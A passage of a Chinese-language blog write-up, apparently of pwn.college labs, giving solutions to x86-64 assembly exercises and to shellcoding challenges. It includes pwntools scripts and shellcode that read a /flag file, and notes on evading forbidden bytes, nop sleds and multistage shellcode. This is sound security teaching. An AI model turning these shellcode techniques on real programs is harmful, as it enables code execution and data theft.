<li><p><code>find /flag -maxdepth 0 -exec cat &#39;&#123;&#125;&#39; \;</code> </p>
</li>
<li></li>
</ul>
<h1 id="module-3-asm"><a href="#module-3-asm" class="headerlink" title="module 3-asm"></a>module 3-asm</h1><p>就是汇编代码的写</p>
<h2 id="3-简单乘法"><a href="#3-简单乘法" class="headerlink" title="3 简单乘法"></a>3 简单乘法</h2><p>要注意mul指令默认被乘数放在rax里面, 乘数由我们指定, 结果是拼接而成的: <strong>RDX:RAX</strong> </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p = process(glob(<span class="hljs-string">&quot;/challenge/e*&quot;</span>))<br><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, rdi</span><br><span class="hljs-string">mov rcx, rdx</span><br><span class="hljs-string">mul rsi</span><br><span class="hljs-string">add rax, rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.send(asm(shellcode))<br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<h2 id="4-5-除法"><a href="#4-5-除法" class="headerlink" title="4-5 除法"></a>4-5 除法</h2><p>被除数放在<strong>RAX</strong>, 除数待定, 结果放在 <strong>RAX</strong>, 余数放在<strong>RDX</strong> </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, rdi</span><br><span class="hljs-string">div rsi</span><br><span class="hljs-string">mov rax, rdx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<h2 id="6-低位寄存器的名称"><a href="#6-低位寄存器的名称" class="headerlink" title="6: 低位寄存器的名称"></a>6: 低位寄存器的名称</h2><p>低位寄存器的名称要特别注意, rdi就是这么写错了, mov的两个操作数如果长度不匹配会报错:<code>unsupported instruction &#39;mov&#39;</code> </p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th>Notes</th>
<th>Type</th>
<th>64</th>
<th>32</th>
<th>16</th>
<th>8</th>
</tr>
</thead>
<tbody><tr>
<td>rax</td>
<td>Values are returned from functions in this register.</td>
<td>scratch</td>
<td>rax</td>
<td>eax</td>
<td>ax</td>
<td>ah and al</td>
</tr>
<tr>
<td>rcx</td>
<td>Typical scratch register.  Some instructions also use it as a counter.</td>
<td>scratch</td>
<td>rcx</td>
<td>ecx</td>
<td>cx</td>
<td>ch and cl</td>
</tr>
<tr>
<td>rdx</td>
<td>Scratch register.</td>
<td>scratch</td>
<td>rdx</td>
<td>edx</td>
<td>dx</td>
<td>dh and dl</td>
</tr>
<tr>
<td><em>rbx</em></td>
<td><em>Preserved register: don’t use it without saving it!</em></td>
<td><em>preserved</em></td>
<td><em>rbx</em></td>
<td><em>ebx</em></td>
<td><em>bx</em></td>
<td><em>bh and bl</em></td>
</tr>
<tr>
<td><em>rsp</em></td>
<td><em>The stack pointer.  Points to the top of the stack (details coming soon!)</em></td>
<td><em>preserved</em></td>
<td><em>rsp</em></td>
<td><em>esp</em></td>
<td><em>sp</em></td>
<td><em>spl</em></td>
</tr>
<tr>
<td><em>rbp</em></td>
<td><em>Preserved register.</em></td>
<td><em>preserved</em></td>
<td><em>rbp</em></td>
<td><em>ebp</em></td>
<td><em>bp</em></td>
<td><em>bpl</em></td>
</tr>
<tr>
<td>rsi</td>
<td>Scratch register.  Function argument #2 in 64-bit Linux</td>
<td>scratch</td>
<td>rsi</td>
<td>esi</td>
<td>si</td>
<td>sil</td>
</tr>
<tr>
<td>rdi</td>
<td>Scratch register.  Function argument #1 in 64-bit Linux</td>
<td>scratch</td>
<td>rdi</td>
<td>edi</td>
<td>di</td>
<td>dil</td>
</tr>
<tr>
<td>r8</td>
<td>Scratch register.  These were added in 64-bit mode</td>
<td>scratch</td>
<td>r8</td>
<td>r8d</td>
<td>r8w</td>
<td>r8b</td>
</tr>
<tr>
<td>r9</td>
<td>Scratch register.</td>
<td>scratch</td>
<td>r9</td>
<td>r9d</td>
<td>r9w</td>
<td>r9b</td>
</tr>
<tr>
<td>r10</td>
<td>Scratch register.</td>
<td>scratch</td>
<td>r10</td>
<td>r10d</td>
<td>r10w</td>
<td>r10b</td>
</tr>
<tr>
<td>r11</td>
<td>Scratch register.</td>
<td>scratch</td>
<td>r11</td>
<td>r11d</td>
<td>r11w</td>
<td>r11b</td>
</tr>
<tr>
<td><em>r12</em></td>
<td><em>Preserved register.  You can use it, but you need to save and restore it.</em></td>
<td><em>preserved</em></td>
<td><em>r12</em></td>
<td><em>r12d</em></td>
<td><em>r12w</em></td>
<td><em>r12b</em></td>
</tr>
<tr>
<td><em>r13</em></td>
<td><em>Preserved register.</em></td>
<td><em>preserved</em></td>
<td><em>r13</em></td>
<td><em>r13d</em></td>
<td><em>r13w</em></td>
<td><em>r13b</em></td>
</tr>
<tr>
<td><em>r14</em></td>
<td><em>Preserved register.</em></td>
<td><em>preserved</em></td>
<td><em>r14</em></td>
<td><em>r14d</em></td>
<td><em>r14w</em></td>
<td><em>r14b</em></td>
</tr>
<tr>
<td><em>r15</em></td>
<td><em>Preserved register.</em></td>
<td><em>preserved</em></td>
<td><em>r15</em></td>
<td><em>r15d</em></td>
<td><em>r15w</em></td>
<td><em>r15b</em></td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov al, dil</span><br><span class="hljs-string">mov bx, si</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<h2 id="8-9-bitwise-op"><a href="#8-9-bitwise-op" class="headerlink" title="8-9 bitwise op"></a>8-9 bitwise op</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-number">8.</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">or  rax, rdi</span><br><span class="hljs-string">and rax, rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-number">9.</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">and rdi, 1</span><br><span class="hljs-string">xor rdi, 1</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">or rax, rdi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<h2 id="10-开始内存操作"><a href="#10-开始内存操作" class="headerlink" title="10. 开始内存操作"></a>10. 开始内存操作</h2><p>注意add没有 <code>add mem, imm</code>这种形式, 因为时钟周期根本不够 </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">mov rdx, 0x404000 </span><br><span class="hljs-string">mov rcx, [rdx] </span><br><span class="hljs-string">mov rax, rcx </span><br><span class="hljs-string">add rcx, 0x1337 </span><br><span class="hljs-string">mov [rdx], rcx </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>11.简单的rax, eax, ax, ah, al的使用.</p>
<p>12.要注意时钟周期的问题. 常数要先移动到寄存器</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, 0xdeadbeef00001337</span><br><span class="hljs-string">mov rbx, 0x000000C0FFEE0000</span><br><span class="hljs-string">mov [rdi], rax</span><br><span class="hljs-string">mov [rsi], rbx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>13.利用地址偏移, 简单的.</p>
<h2 id="14-16-栈相关指令-太简单了-都是些基础题-过了就算了"><a href="#14-16-栈相关指令-太简单了-都是些基础题-过了就算了" class="headerlink" title="14-16.栈相关指令. 太简单了, 都是些基础题, 过了就算了"></a>14-16.栈相关指令. 太简单了, 都是些基础题, 过了就算了</h2><h2 id="17-跳转"><a href="#17-跳转" class="headerlink" title="17. 跳转"></a>17. 跳转</h2><p>nop的数量数错了, 诶他说的是0x51 bytes from current position, 但是这指的是jmp后面一条指令的地址. 不是jmp的起始地址…..</p>
<p>还要注意<code>绝对跳转只能是间接跳转(line 6)</code>( 要和<code>条件跳转只能是直接跳转</code>一起记清楚 )</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">jmp L1</span><br><span class="hljs-string">(0x51 nops)</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">mov rcx, 0x403000</span><br><span class="hljs-string">jmp rcx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>18.if-elif-else连环, 要注意的是他说[rdi]是一个双字, 可能是一个负数, 所以我第一次写的<code>QWORD PTR</code>就错了, 只能是<code>DWORD PTR</code> </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov eax, [rdi+4]</span><br><span class="hljs-string">mov r8d, [rdi+8]</span><br><span class="hljs-string">mov r9d, [rdi+12]</span><br><span class="hljs-string">cmp DWORD ptr [rdi], 0x7f454c46 #!!!!!!</span><br><span class="hljs-string">jne leif</span><br><span class="hljs-string">add eax, r8d</span><br><span class="hljs-string">add eax, r9d</span><br><span class="hljs-string">jmp done</span><br><span class="hljs-string"></span><br><span class="hljs-string">leif:</span><br><span class="hljs-string">cmp DWORD PTR[rdi], 0x00005A4D #!!!!!!                                                 </span><br><span class="hljs-string">jne else</span><br><span class="hljs-string">sub eax, r8d</span><br><span class="hljs-string">sub eax, r9d</span><br><span class="hljs-string">jmp done</span><br><span class="hljs-string"></span><br><span class="hljs-string">else:</span><br><span class="hljs-string">    mul r8d</span><br><span class="hljs-string">    mul r9d</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>19.<strong>条件跳转只能是直接跳转</strong> </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    CMP RDI, 4</span><br><span class="hljs-string">    JL AAA</span><br><span class="hljs-string">    MOV RDI, 4</span><br><span class="hljs-string">AAA:</span><br><span class="hljs-string">    mov rax, rdi</span><br><span class="hljs-string">    mov rbx, 8</span><br><span class="hljs-string">    mul rbx</span><br><span class="hljs-string">    mov ebx, DWORD PTR [rax+rsi]</span><br><span class="hljs-string">    jmp rbx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>20.折腾了半天, 发现题目描述有错的地方, 这里明明是DWORD, 说成quad word.</p>
<p>还有一点被我忽略了, 如果按照add eax, ebx的做法, <strong>那么超出四字节的部分会被舍弃</strong> </p>
<p>这里我想到的做法是用eax取出双字数据, 然后用rax做加法.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    mov eax, [rdi+rbx*4]    #在这里</span><br><span class="hljs-string">    add rcx, rax</span><br><span class="hljs-string">    inc rbx</span><br><span class="hljs-string">test:</span><br><span class="hljs-string">    cmp rbx, rsi</span><br><span class="hljs-string">    jne loop</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax, rcx</span><br><span class="hljs-string">div rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>21.硬是没有简化成</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">test rdi, rdi                                                                                                                                                                                 </span><br><span class="hljs-string">jz done</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    inc rdi</span><br><span class="hljs-string">    inc rax</span><br><span class="hljs-string">test:</span><br><span class="hljs-string">    mov cl, [rdi]</span><br><span class="hljs-string">    test rcx, rcx</span><br><span class="hljs-string">    jne loop</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<h2 id="22-调用"><a href="#22-调用" class="headerlink" title="22.调用"></a>22.调用</h2><p>又是折腾了半天, 主要是逐字节比较的, 从题干也看不出来啊, 孤零零的[src_addr]真就指一个BYTE</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">mov r12, 0x403000</span><br><span class="hljs-string">mov rdx, rdi    ; tmp store rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">test rdx, rdx</span><br><span class="hljs-string">jz done</span><br><span class="hljs-string"></span><br><span class="hljs-string">test:</span><br><span class="hljs-string">mov rsi, [rdx]</span><br><span class="hljs-string">test sil, sil    ;fetched from memory and then comparized bitwise</span><br><span class="hljs-string">jz done</span><br><span class="hljs-string"></span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">cmp sil, 90</span><br><span class="hljs-string">jg if</span><br><span class="hljs-string">mov r13, rax    ;preparation for call foo at 0x403000</span><br><span class="hljs-string">mov dil, [rdx]</span><br><span class="hljs-string">call r12</span><br><span class="hljs-string">mov [rdx], al</span><br><span class="hljs-string">mov rax, r13</span><br><span class="hljs-string">inc rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">if:</span><br><span class="hljs-string">inc rdx</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>23.偷懒, 用了别人的代码, 复习操作系统去了</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">;source code:<br>most_common_byte(src_addr, size):<br>    b = <span class="hljs-number">0</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i &lt;= size-<span class="hljs-number">1</span>:<br>        curr_byte = [src_addr + i]<br>        [stack_base - curr_byte] += <span class="hljs-number">1</span><br>    b = <span class="hljs-number">0</span><br><br>    max_freq = <span class="hljs-number">0</span><br>    max_freq_byte = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> b &lt;= <span class="hljs-number">0xff</span>:<br>        <span class="hljs-keyword">if</span> [stack_base - b] &gt; max_freq:<br>            max_freq = [stack_base - b]<br>            max_freq_byte = b<br><br>    <span class="hljs-keyword">return</span> max_freq_byte<br></code></pre></div></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push rbp</span><br><span class="hljs-string">    mov rbp, rsp</span><br><span class="hljs-string">    sub rsp, 0x100</span><br><span class="hljs-string">    mov rbx, -1</span><br><span class="hljs-string">AAA:</span><br><span class="hljs-string">    add rbx, 1</span><br><span class="hljs-string">    cmp rbx, rsi</span><br><span class="hljs-string">    je BBB</span><br><span class="hljs-string">    mov cl, byte ptr [rdi+rbx]</span><br><span class="hljs-string">    add BYTE ptr [rsp+rcx], 1</span><br><span class="hljs-string">    jmp AAA</span><br><span class="hljs-string"></span><br><span class="hljs-string">BBB:</span><br><span class="hljs-string">    mov rbx, -1</span><br><span class="hljs-string">    xor rcx, rcx</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">CCC:</span><br><span class="hljs-string">    add rbx, 1</span><br><span class="hljs-string">    cmp rbx, 0x100</span><br><span class="hljs-string">    je DDD</span><br><span class="hljs-string">    cmp BYTE ptr [rsp+rbx], CL</span><br><span class="hljs-string">    jle CCC</span><br><span class="hljs-string">    mov CL, BYTE ptr [rsp+rbx]</span><br><span class="hljs-string">    mov rdx, rbx</span><br><span class="hljs-string">    JMP CCC</span><br><span class="hljs-string"></span><br><span class="hljs-string">DDD:</span><br><span class="hljs-string">    mov rax, rdx</span><br><span class="hljs-string">    mov rsp, rbp</span><br><span class="hljs-string">    pop rbp</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure>

<h1 id="module-4-sc"><a href="#module-4-sc" class="headerlink" title="module 4-sc"></a>module 4-sc</h1><p>基本全在PPT里面.</p>
<h2 id="0-基本操作"><a href="#0-基本操作" class="headerlink" title="0.基本操作"></a>0.基本操作</h2><ul>
<li>intro:<ul>
<li><p>Buiding shellcode: just using pwntools.</p>
</li>
<li><p>Debugging: strace or gdb</p>
</li>
</ul>
</li>
<li>common challenge:<ul>
<li><p><strong>forbidden bytes:</strong> such as <code>NULL(&#39;\0&#39;)</code>, <code>whitespace</code>,  <code>&#39;H&#39;</code> and so on.</p>
</li>
<li><p><strong>self-modifying codes</strong> in level 5.<br><code>gcc -Wl,-N --static -nostdlib -o test test.s</code> to make writable <code>.text</code> segment</p>
</li>
<li><p><strong>multistage shellcoding:</strong><br>read into later bytes; or read into <code>read(0, rip, 1000)</code> (using <code>lea rax, [rip]</code> get rip)</p>
</li>
<li><p><strong>Shellcode Mangling:</strong><br><u>work backwards</u>  or  <u>jump over some parts to avoid them</u>.</p>
</li>
<li><p><strong>Unable to speak:</strong><br>if you can communicate one bit, then you can communicate.<br>such as a exit code? maybe inefficient. or signal? or …</p>
</li>
</ul>
</li>
<li>Remain injection points: JIT, jus-in-time, 即时.</li>
</ul>
<p>avoid null-bytes:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov rdi, 0 -&gt; xor rdi, rdi<br>xor edi, edi //will clear rdi<br>mov rax, 2 -&gt; mov al , 2<br>mov rsi, 100 -&gt; xor rsi, rsi / mov si, 100<br>;set a byte(0x01) in the asm, then dec that address<br>lea rdi, [rip+0x3d] -&gt; mov byte ptr [rip+1], &#x27;/&#x27; ;and then, the whole string: &#x27;/flag&#x27;<br></code></pre></div></td></tr></table></figure>

<h2 id="1-开始"><a href="#1-开始" class="headerlink" title="1.开始"></a>1.开始</h2><p>非常直接的一道题目, 不过我重新认识了一下shellcode, 原来amd64.open做的事情还包括防止指令序列中出现<code>&#39;\0&#39;</code>, 以前用的都没有细想这个问题. 不过前两题都是用的read函数直接读取stdin直到eof, 所以不需要担心空字符的问题.<del>amd64.open这个函数我都没有在文档里面查到.</del> </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/b*&quot;</span>)[<span class="hljs-number">1</span>] <span class="hljs-comment">#直接使用wildcard, 不过会匹配到c和binary, 选择第二个即可</span><br>context.binary = binary<br>p = process(binary) <br><br>p.recvuntil(<span class="hljs-string">&quot;stack at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br><span class="hljs-comment">#打开文件, rax存储fd, 从文件中读取到内存中addr+0x100, 然后写到stdout</span><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode)<br>p.recv()<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<p>测试程序直接从stdin读取bytes然后存储到数组中, 把数组指针转换成函数指针调用即可执行shellcode.</p>
<p>附一个asm, 了解一下原理.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">movabs rax, 0x101010101010101<br>push rax<br>movabs rax, 0x1010166606d672e # 写入&#x27;flag&#x27;字符串<br>xor qword ptr [rsp], rax<br>mov rdi, rsp<br>xor edx, edx<br>xor esi, esi<br>push 2<br>pop rax<br>syscall    # open<br><br>mov rdi, rax<br>xor eax, eax<br>xor edx, edx<br>mov dh, 1<br>movabs rsi, 0x101010101010101<br>push rsi<br>movabs rsi, 0x1017eff3d8d4981<br>xor qword ptr [rsp], rsi<br>pop rsi<br>syscall # read<br><br>push 1<br>pop rdi<br>xor edx, edx<br>mov dh, 1<br>movabs rsi, 0x101010101010101<br>push rsi<br>movabs rsi, 0x1017eff3d8d4981<br>xor qword ptr [rsp], rsi<br>pop rsi<br>push 1<br>pop rax<br>syscall     # write to stdout<br></code></pre></div></td></tr></table></figure>

<h2 id="2-emmmm"><a href="#2-emmmm" class="headerlink" title="2.emmmm"></a>2.emmmm</h2><blockquote>
<p>This challenge will <strong>randomly skip up to 0x800 bytes</strong> in your shellcode. You better adapt to that! One way to evade this is to have your shellcode start with a long set of single-byte instructions that do nothing, such as <code>nop</code>, before the actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly execute and then your real shellcode will run. This concept is called a <code>nop sled</code>.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">In [3]: asm(&#x27;nop&#x27;) <br>Out[3]: b&#x27;\x90&#x27;<br></code></pre></div></td></tr></table></figure>

<p>使用右对齐, <code>fillchar=&#39;\x90’</code>. 即<code>payload = asm(shellcode).rjust(0x800, ‘\90’);</code> </p>
